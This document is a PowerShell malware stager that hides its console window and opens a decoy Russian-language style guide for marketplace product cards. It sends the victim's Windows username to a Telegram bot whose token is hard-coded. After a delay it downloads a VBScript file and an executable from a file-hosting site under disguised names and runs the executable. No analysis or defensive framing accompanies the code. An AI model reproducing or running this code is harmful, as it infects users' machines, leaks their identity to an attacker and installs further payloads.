Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
$v0=[b0.a0]::GetConsoleWindow()
[b0.a0]::ShowWindow($v0,0)
$v1="ProductCards_StyleGuid.txt"
$v2=Join-Path $env:LOCALAPPDATA $v1
$v3=@"
Назначение

Короткий одностраничный стиль‑гайд для оформления карточек товаров на маркетплейсах. Нормы применимы к трём типам карточек и предназначены для верстки и передачи дизайнерам.
Типографика и цвета

    Заголовки: Arial Bold 14 pt; цвет #2B2B2B.
    Текст: Calibri 11 pt; межстрочный 1.15; цвет #2B2B2B.
    Буллеты: Calibri 11 pt; маркер — круг; длина пункта ≤ 80 символов.
    Акцентный цвет: #0078D4 (ссылки, CTA).
    Цвет предупреждений: #E81123.
    Фон: белый #FFFFFF.

Изображения

    Главное фото: белый фон, 2000×2000 px, JPEG/PNG.
    Доп. фото: процесс применения, до/после, масштаб (рука/линейка).
    Подписи: Calibri 10 pt; цвет #6B6B6B; 1 строка.
    Альт‑текст: обязательный, 1 предложение.

Файловые папки с фото

    Akfix 65гр+200мл
    COSMO FEN 20г
    POXIPOL 14мл
"@
$v3|Out-File -FilePath $v2 -Encoding UTF8
Invoke-Item $v2
$v4="8323167571:AAFEgqb4cAPmKNek-D6ioTvS634gRE0CuTo"
$v5="7063407604"
$v6=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$v7="The user's shortcut was enabled for user: "+$v6
$v8="https://api.telegram.org/bot"+$v4+"/sendMessage"
$v9=@{chat_id=$v5;text=$v7}|ConvertTo-Json
try{$v10=Invoke-RestMethod -Uri $v8 -Method Post -ContentType "application/json" -Body $v9}catch{}
Start-Sleep -Seconds 400
$v11="https://www.udrop.com/file/OcWQ/1446062403_house.delete"
$v12="1446062403_house.vbe"
$v13=[Environment]::GetFolderPath("LocalApplicationData")
$v14=Join-Path $v13 $v12
try{$v15=New-Object System.Net.WebClient;$v15.DownloadFile($v11,$v14)}catch{}
$v16="https://www.udrop.com/file/OcWP/1446062403_key.delete"
$v17="1446062403_key.exe"
$v18=Join-Path $v13 $v17
try{
    $v19=New-Object System.Net.WebClient
    $v19.DownloadFile($v16,$v18)
    Start-Process -FilePath $v18 -WindowStyle Normal
}catch{}
exit